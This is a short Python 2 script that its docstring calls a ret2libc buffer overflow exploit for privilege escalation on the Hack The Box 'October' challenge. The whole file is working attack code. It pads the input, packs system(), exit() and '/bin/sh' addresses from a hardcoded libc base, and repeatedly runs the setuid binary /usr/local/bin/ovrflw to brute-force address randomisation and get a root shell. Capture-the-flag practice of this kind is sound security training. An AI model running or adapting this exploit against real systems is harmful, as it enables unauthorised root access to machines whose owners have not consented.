"""
A buffer overflow / ret2libc exploit for privilege escalation
on the Hack The Box October challenge.
"""
#!/usr/bin/python2

import struct, subprocess

buf = "A" * 112

libcaddr = 0xb75aa000

systemaddr = struct.pack('<I', libcaddr + 0x00040310)

exitaddr = struct.pack('<I', libcaddr + 0x00033260)

shaddr = struct.pack('<I', libcaddr + 0x00162bac)

payload = buf + systemaddr + exitaddr + shaddr

while True:
    subprocess.call(["/usr/local/bin/ovrflw", payload])